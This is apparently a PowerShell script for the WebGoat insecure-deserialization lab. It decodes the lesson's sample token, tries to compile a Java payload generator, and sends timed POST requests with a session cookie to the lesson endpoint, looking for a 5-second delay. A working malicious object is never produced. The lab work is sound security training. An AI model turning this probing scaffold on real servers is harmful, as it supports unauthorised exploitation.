# ============================================================
# WebGoat Deserialization Attack - VulnerableTaskHolder
# ============================================================
# Creates and tests serialized VulnerableTaskHolder payloads
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Deserialization Attack - VulnerableTaskHolder" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# First, let's decode the original payload to understand the structure
$originalPayload = "rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l"

Write-Host "[INFO] Original payload decodes to:" -ForegroundColor Yellow
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($originalPayload))
Write-Host "  '$decoded'" -ForegroundColor White
Write-Host ""

# Step 1: Compile the Java payload generator
Write-Host "[STEP 1] Compiling VulnerableTaskHolder payload generator..." -ForegroundColor Yellow

if (Test-Path "VulnerableTaskHolderPayload.java") {
    $compileResult = javac VulnerableTaskHolderPayload.java 2>&1
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "  Compilation successful!" -ForegroundColor Green
    } else {
        Write-Host "  Compilation failed: $compileResult" -ForegroundColor Red
        Write-Host ""
        Write-Host "Trying alternative approach..." -ForegroundColor Yellow
    }
} else {
    Write-Host "  VulnerableTaskHolderPayload.java not found!" -ForegroundColor Red
}

Write-Host ""

# Step 2: Try to generate the payload
if (Test-Path "VulnerableTaskHolderPayload.class") {
    Write-Host "[STEP 2] Generating payload..." -ForegroundColor Yellow
    
    $output = java VulnerableTaskHolderPayload 2>&1
    Write-Host $output
    Write-Host ""
}

# Step 3: Manual payload construction approaches
Write-Host "[STEP 3] Alternative approach - Manual payload construction" -ForegroundColor Yellow
Write-Host ""

Write-Host "Since we can't directly compile the WebGoat class, let's try these approaches:" -ForegroundColor White
Write-Host ""

Write-Host "Approach 1: Use browser console to test the endpoint" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Gray
Write-Host @"
// Open WebGoat in browser, press F12, go to Console, run:

async function testDeserialization(payload) {
    const startTime = Date.now();
    
    const response = await fetch('/WebGoat/InsecureDeserialization/task', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'token=' + encodeURIComponent(payload),
        credentials: 'include'
    });
    
    const endTime = Date.now();
    const elapsedTime = (endTime - startTime) / 1000;
    
    const result = await response.json();
    
    console.log('Response:', result);
    console.log('Time taken:', elapsedTime, 'seconds');
    
    return result;
}

// Test with original payload
testDeserialization('rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l');

"@ -ForegroundColor White

Write-Host ""
Write-Host ""

Write-Host "Approach 2: Test with PowerShell" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Gray
Write-Host ""

# Function to test a payload
function Test-DeserializationPayload {
    param(
        [string]$payload,
        [string]$description
    )
    
    Write-Host "Testing: $description" -ForegroundColor Yellow
    
    $startTime = Get-Date
    
    $headers = @{
        "Content-Type" = "application/x-www-form-urlencoded"
        "Cookie" = "JSESSIONID=$sessionCookie"
    }
    
    $body = "token=$([System.Web.HttpUtility]::UrlEncode($payload))"
    
    try {
        $response = Invoke-WebRequest `
            -Uri "$webGoatUrl/WebGoat/InsecureDeserialization/task" `
            -Method POST `
            -Headers $headers `
            -Body $body `
            -UseBasicParsing `
            -TimeoutSec 30
        
        $endTime = Get-Date
        $elapsed = ($endTime - $startTime).TotalSeconds
        
        $result = $response.Content | ConvertFrom-Json
        
        Write-Host "  Response: $($result.feedback)" -ForegroundColor White
        Write-Host "  Time: $([math]::Round($elapsed, 2)) seconds" -ForegroundColor Cyan
        Write-Host "  Lesson Complete: $($result.lessonCompleted)" -ForegroundColor White
        
        if ($elapsed -ge 4.5 -and $elapsed -le 5.5) {
            Write-Host "  [SUCCESS] Delay is approximately 5 seconds!" -ForegroundColor Green
        }
        
        Write-Host ""
        return $result
        
    } catch {
        $endTime = Get-Date
        $elapsed = ($endTime - $startTime).TotalSeconds
        
        Write-Host "  [ERROR] $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "  Time: $([math]::Round($elapsed, 2)) seconds" -ForegroundColor Cyan
        Write-Host ""
    }
}

# Test with original payload first
Write-Host "Testing original payload to establish baseline..." -ForegroundColor Cyan
Test-DeserializationPayload -payload $originalPayload -description "Original String payload"

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Next Steps:" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "1. Check the feedback from the test above" -ForegroundColor White
Write-Host "2. Look for hints about:" -ForegroundColor White
Write-Host "   - Expected class name (VulnerableTaskHolder)" -ForegroundColor Gray
Write-Host "   - Version number" -ForegroundColor Gray
Write-Host "   - Allowed actions" -ForegroundColor Gray
Write-Host ""
Write-Host "3. We need to craft a proper Java serialized object" -ForegroundColor White
Write-Host "   The challenge is that we need the EXACT class from WebGoat" -ForegroundColor Gray
Write-Host ""
Write-Host "4. Possible solutions:" -ForegroundColor White
Write-Host "   a) Extract the class from WebGoat (if available)" -ForegroundColor Gray
Write-Host "   b) Use reflection/bytecode manipulation" -ForegroundColor Gray
Write-Host "   c) Try common serialization patterns" -ForegroundColor Gray
Write-Host ""
